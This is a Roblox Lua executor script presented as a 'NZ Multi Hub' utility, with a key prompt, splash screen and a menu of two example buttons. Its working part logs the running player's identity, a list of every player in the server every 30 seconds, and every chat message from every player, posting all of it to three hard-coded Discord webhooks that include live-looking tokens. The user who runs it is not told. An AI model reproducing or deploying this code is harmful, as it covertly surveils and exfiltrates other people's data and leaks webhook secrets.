--// NZ MULTI HUB v2.6 ENHANCED

------------------------
-- ANTI DOUBLE EXEC
------------------------
if getgenv().NZ_MULTI_HUB then return end
getgenv().NZ_MULTI_HUB = true
getgenv().IY_LOADED = false

------------------------
-- SERVICES
------------------------
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")
local Lighting = game:GetService("Lighting")
local HttpService = game:GetService("HttpService")
local LP = Players.LocalPlayer
local StarterGui = game:GetService("StarterGui")
local ChatService = game:GetService("Chat")

------------------------
-- TIME TRACK
------------------------
local START_TIME = os.clock()
local function GetUptime()
    return string.format("%.1f", os.clock() - START_TIME)
end

------------------------
-- WEBHOOKS
------------------------
local WEBHOOK_MAIN = "https://discord.com/api/webhooks/1459298646590754827/TOc_e3_kHwZepKoMQB8EhwSMdFP7_avoyV6kYbmLVV4m6RqwwTha5eltf69snHOuLNKk"
local WEBHOOK_PLAYERS = "https://discord.com/api/webhooks/1459368985920540692/e6kW7yWiHoK10YDM2VmkXtnGJQ8alQtfkgBYcm_Ddwg6NCsJN_PLOX6TBMF828hg8eCL"
local WEBHOOK_CHAT = "https://discord.com/api/webhooks/1459368825286955234/cQImuL2TJBPkY1kYn1B-EKEl1MJnMupf5ZyVOQ9el-bZKITGIw6edwMsz4Fo5DC_V8Tz"

local function SendLog(webhook, action, extraFields)
    local fields = {
        {name="👤 Player", value=LP.Name, inline=true},
        {name="🆔 UserId", value=tostring(LP.UserId), inline=true},
        {name="🔗 Profile", value="https://www.roblox.com/users/"..LP.UserId.."/profile"},
        {name="🎮 PlaceId", value=tostring(game.PlaceId), inline=true},
        {name="🕹️ GameName", value=game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, inline=true},
        {name="⚙️ Action", value=action},
        {name="⏱️ Uptime", value=GetUptime().."s"},
        {name="🕒 Time", value=os.date("%X")}
    }

    if extraFields then
        for _, f in pairs(extraFields) do
            table.insert(fields,f)
        end
    end

    local data = {
        username = "NZ Multi Hub",
        embeds = {{title="NZ HUB LOG", color=0x9b59ff, fields=fields}}
    }

    pcall(function()
        request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"]="application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

------------------------
-- KEY SYSTEM (mejor estética)
------------------------
local KEY = "NZteam"

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "NZ_MULTI_HUB"
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game.CoreGui

local KeyFrame = Instance.new("Frame", ScreenGui)
KeyFrame.Size = UDim2.fromOffset(350,180)
KeyFrame.Position = UDim2.new(0.5,-175,0.5,-90)
KeyFrame.BackgroundColor3 = Color3.fromRGB(25,25,35)
KeyFrame.BorderSizePixel = 0
Instance.new("UICorner",KeyFrame).CornerRadius = UDim.new(0,20)

local Title = Instance.new("TextLabel", KeyFrame)
Title.Size = UDim2.new(1,0,0,50)
Title.Position = UDim2.new(0,0,0,10)
Title.Text = "NZ Multi Hub"
Title.Font = Enum.Font.GothamBold
Title.TextSize = 26
Title.TextColor3 = Color3.fromRGB(180,180,255)
Title.BackgroundTransparency = 1

local KeyBox = Instance.new("TextBox", KeyFrame)
KeyBox.Size = UDim2.new(1,-40,0,40)
KeyBox.Position = UDim2.new(0,20,0,70)
KeyBox.PlaceholderText = "Enter Key..."
KeyBox.Text = ""
KeyBox.ClearTextOnFocus = false
KeyBox.Font = Enum.Font.Gotham
KeyBox.TextSize = 16
KeyBox.BackgroundColor3 = Color3.fromRGB(35,35,45)
KeyBox.TextColor3 = Color3.fromRGB(255,255,255)
Instance.new("UICorner",KeyBox).CornerRadius = UDim.new(0,12)

local KeyBtn = Instance.new("TextButton",KeyFrame)
KeyBtn.Size = UDim2.new(1,-40,0,40)
KeyBtn.Position = UDim2.new(0,20,1,-50)
KeyBtn.Text = "Unlock"
KeyBtn.Font = Enum.Font.GothamBold
KeyBtn.TextSize = 18
KeyBtn.TextColor3 = Color3.fromRGB(255,255,255)
KeyBtn.BackgroundColor3 = Color3.fromRGB(80,40,200)
Instance.new("UICorner",KeyBtn).CornerRadius = UDim.new(0,12)

KeyBtn.MouseButton1Click:Connect(function()
    if KeyBox.Text == KEY then
        SendLog(WEBHOOK_MAIN,"Key Accepted")
        KeyFrame:Destroy()
        getgenv().IY_LOADED = true
    else
        KeyBox.Text = "Wrong Key"
        KeyBox.TextColor3 = Color3.fromRGB(255,100,100)
    end
end)

repeat task.wait() until getgenv().IY_LOADED

------------------------
-- INTRO
------------------------
local Blur = Instance.new("BlurEffect", Lighting)

local function Splash(txt,t)
    local l = Instance.new("TextLabel",ScreenGui)
    l.Size = UDim2.new(1,0,0,60)
    l.Position = UDim2.new(0,0,0.45,0)
    l.BackgroundTransparency = 1
    l.Text = txt
    l.Font = Enum.Font.GothamBold
    l.TextSize = 32
    l.TextTransparency = 1

    task.spawn(function()
        while l.Parent do
            l.TextColor3 = Color3.fromHSV(tick()%5/5,1,1)
            task.wait()
        end
    end)

    TweenService:Create(l,TweenInfo.new(.4),{TextTransparency=0}):Play()
    TweenService:Create(Blur,TweenInfo.new(.4),{Size=18}):Play()
    task.wait(t)
    TweenService:Create(l,TweenInfo.new(.4),{TextTransparency=1}):Play()
    TweenService:Create(Blur,TweenInfo.new(.4),{Size=0}):Play()
    task.wait(.4)
    l:Destroy()
end

Splash("NZ MULTI HUB",1.2)
Splash("by NZ Team",1)

SendLog(WEBHOOK_MAIN,"Hub Loaded")

------------------------
-- MENÚ (abrir con Z)
------------------------
local MenuFrame = Instance.new("Frame",ScreenGui)
MenuFrame.Size = UDim2.fromOffset(400,300)
MenuFrame.Position = UDim2.new(0.5,-200,0.5,-150)
MenuFrame.BackgroundColor3 = Color3.fromRGB(20,20,25)
MenuFrame.Visible = false
Instance.new("UICorner",MenuFrame).CornerRadius = UDim.new(0,20)

UIS.InputBegan:Connect(function(input, gp)
    if input.KeyCode == Enum.KeyCode.Z then
        MenuFrame.Visible = not MenuFrame.Visible
    end
end)

------------------------
-- LOG PLAYERS (cada 30s)
------------------------
task.spawn(function()
    while true do
        local playerList = {}
        for _,plr in pairs(Players:GetPlayers()) do
            table.insert(playerList, plr.Name.." ["..plr.UserId.."]")
        end
        SendLog(WEBHOOK_PLAYERS,"Server Player List",{{name="Players",value=table.concat(playerList,", "),inline=false}})
        task.wait(30)
    end
end)

------------------------
-- LOG CHAT
------------------------
Players.PlayerAdded:Connect(function(plr)
    plr.Chatted:Connect(function(msg)
        SendLog(WEBHOOK_CHAT,"Chat Message",{ {name="Player", value=plr.Name, inline=true}, {name="Message", value=msg, inline=false} })
    end)
end)
for _,plr in pairs(Players:GetPlayers()) do
    plr.Chatted:Connect(function(msg)
        SendLog(WEBHOOK_CHAT,"Chat Message",{ {name="Player", value=plr.Name, inline=true}, {name="Message", value=msg, inline=false} })
    end)
end

------------------------
-- EJEMPLO DE BOTONES EN MENU
------------------------
local function AddButton(name,func)
    local btn = Instance.new("TextButton",MenuFrame)
    btn.Size = UDim2.new(1,-20,0,40)
    btn.Position = UDim2.new(0,10,0,#MenuFrame:GetChildren()*50)
    btn.Text = name
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 18
    btn.TextColor3 = Color3.fromRGB(255,255,255)
    btn.BackgroundColor3 = Color3.fromRGB(70,30,200)
    Instance.new("UICorner",btn).CornerRadius = UDim.new(0,12)

    btn.MouseButton1Click:Connect(function()
        SendLog(WEBHOOK_MAIN,"Button clicked: "..name)
        func()
    end)
end

-- Ejemplo de botones
AddButton("Rejoin Game", function()
    TeleportService:Teleport(game.PlaceId, LP)
end)

AddButton("Dummy Action", function()
    print("Dummy executed")
end)
